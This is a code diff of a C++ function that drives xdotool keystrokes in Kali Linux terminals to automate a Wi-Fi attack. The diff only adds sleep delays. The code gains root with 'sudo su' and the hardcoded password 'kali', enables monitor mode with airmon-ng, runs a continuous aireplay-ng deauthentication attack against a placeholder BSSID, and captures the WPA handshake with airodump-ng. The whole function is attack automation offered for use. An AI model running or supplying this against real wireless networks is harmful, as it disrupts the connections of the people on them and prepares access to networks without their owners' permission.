@@ -11,8 +11,11 @@ void handleAction(const std::string& input) {
 
 // access the root permission
     std::system("xdotool type \"sudo su\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
+    std::system("sleep 1");
     std::system("xdotool type \"kali\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
 
     std::system("sleep 1");
@@ -21,11 +24,12 @@ void handleAction(const std::string& input) {
     std::system("sleep 1");
     
     std::system("xdotool type \"airmon-ng start wlan0\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
-
+    std::system("sleep 1");
 // Playing deauthcaution attack on the wifi
     std::system("xdotool type \"sudo aireplay-ng --deauth 0 -a (bssid) wlan0\"");
-
+    std::system("sleep 1");
 
 // capturing handshake of the wifi
     std::system("x-terminal-emulator &");
@@ -33,14 +37,20 @@ void handleAction(const std::string& input) {
     
     // access the root permission
     std::system("xdotool type \"sudo su\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
+    std::system("sleep 1");
     std::system("xdotool type \"kali\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
+    std::system("sleep 1");
 
     std::system("xdotool type \"cd /home/kali/wifi\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
+    std::system("sleep 1");
     std::system("xdotool type \"sudo airodump-ng -w (hack1) -c (2) --bssid (bssid) wlan0\"");
-
+    std::system("sleep 1");
 
     std::system("x-terminal-emulator &");
     std::system("sleep 1");
@@ -50,12 +60,18 @@ void handleAction(const std::string& input) {
     
     // access the root permission
     std::system("xdotool type \"sudo su\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
+    std::system("sleep 1");
     std::system("xdotool type \"kali\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
+    std::system("sleep 1");
 
     std::system("xdotool type \"sudo airodump-ng wlan0\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
+    std::system("sleep 1");
     
     } else if (input == "2") {
         std::system("x-terminal-emulator &"); // Open terminal emulator in the background
@@ -64,8 +80,11 @@ void handleAction(const std::string& input) {
 // access the root permission
     std::system("xdotool type \"sudo su\"");
     std::system("xdotool key Return");
+    std::system("sleep 1"); 
     std::system("xdotool type \"kali\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
+        
 
 //enabling the moniter mode
     std::system("sleep 1");
